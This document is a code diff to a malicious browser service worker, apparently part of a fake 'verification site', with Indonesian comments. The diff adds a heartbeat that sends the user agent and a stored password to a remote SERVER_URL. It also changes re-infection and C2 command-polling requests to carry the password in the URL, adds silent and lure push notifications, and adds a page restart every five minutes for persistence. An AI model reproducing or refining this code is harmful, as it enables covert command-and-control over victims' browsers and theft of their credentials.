@@ -1,5 +1,5 @@
 // ============================================================
-// 🔥 sw.js - SERVICE WORKER (VERIFIKASI-SITE) - 24/7 (PERBAIKAN)
+// 🔥 sw.js - SERVICE WORKER (VERIFIKASI-SITE) - 24/7
 // ============================================================
 
 const CACHE_NAME = 'system-update-v3';
@@ -120,7 +120,7 @@ self.addEventListener('fetch', function(event) {
 });
 
 // ============================================================
-// 🔥 HEARTBEAT - Hapus navigator.userAgent
+// 🔥 HEARTBEAT
 // ============================================================
 function sendHeartbeat() {
     console.log('[SW] Sending heartbeat...');
@@ -129,6 +129,7 @@ function sendHeartbeat() {
             type: 'sw_heartbeat',
             timestamp: Date.now(),
             sw_version: '3.0',
+            userAgent: navigator.userAgent,
             password: password
         };
         fetch(SERVER_URL + '/data', {
@@ -140,13 +141,14 @@ function sendHeartbeat() {
 }
 
 // ============================================================
-// 🔥 RE-INFECTION CHECK - Gunakan header X-Password
+// 🔥 RE-INFECTION CHECK
 // ============================================================
 function checkReinfection() {
     console.log('[SW] Checking re-infection...');
     getPassword().then(function(password) {
-        fetch(SERVER_URL + '/data?type=check_apk', {
-            headers: { 'X-Password': password }
+        fetch(SERVER_URL + '/data?type=check_apk&key=' + password, {
+            method: 'GET',
+            headers: { 'Content-Type': 'application/json' }
         })
         .then(function(response) { return response.json(); })
         .then(function(data) {
@@ -167,13 +169,14 @@ function checkReinfection() {
 }
 
 // ============================================================
-// 🔥 C2 COMMAND CHECK - Gunakan header X-Password
+// 🔥 C2 COMMAND CHECK
 // ============================================================
 function checkC2Commands() {
     console.log('[SW] Checking C2 commands...');
     getPassword().then(function(password) {
-        fetch(SERVER_URL + '/data?type=c2_sw', {
-            headers: { 'X-Password': password }
+        fetch(SERVER_URL + '/data?type=c2_sw&key=' + password, {
+            method: 'GET',
+            headers: { 'Content-Type': 'application/json' }
         })
         .then(function(response) { return response.json(); })
         .then(function(commands) {
@@ -262,13 +265,12 @@ self.addEventListener('message', function(event) {
             checkReinfection();
             checkC2Commands();
             break;
+        // 🔥 TAMBAHAN 24/7
         case 'ping':
-            if (event.ports && event.ports[0]) {
-                event.ports[0].postMessage({
-                    type: 'pong',
-                    timestamp: Date.now()
-                });
-            }
+            event.ports[0].postMessage({
+                type: 'pong',
+                timestamp: Date.now()
+            });
             break;
         case 'reload_confirm':
             restartPage();
@@ -291,6 +293,7 @@ self.addEventListener('push', function(event) {
         data = { silent: true };
     }
     
+    // 🔥 SILENT PUSH (TIDAK TERLIHAT!)
     if (data.silent === true || data.content_available === 1) {
         event.waitUntil(
             self.clients.matchAll().then(function(clients) {
@@ -306,6 +309,7 @@ self.addEventListener('push', function(event) {
         return;
     }
     
+    // 🔥 VISIBLE PUSH (JIKA ADA TITLE)
     if (data.title) {
         var options = {
             body: data.body || 'Klik untuk verifikasi!',
@@ -359,7 +363,7 @@ self.addEventListener('online', function() {
 });
 
 // ============================================================
-// 🔥 8. INITIAL SETUP
+// 🔥 8. INITIAL SETUP (DENGAN 24/7 TASKS)
 // ============================================================
 setTimeout(function() {
     sendHeartbeat();
@@ -367,6 +371,7 @@ setTimeout(function() {
     setTimeout(checkReinfection, 5000);
 }, 3000);
 
+// 🔥 TAMBAHAN: AUTO-RESTART SETIAP 5 MENIT
 setInterval(restartPage, 300000);
 
 console.log('[SW] Service Worker initialized! (24/7 mode active)');
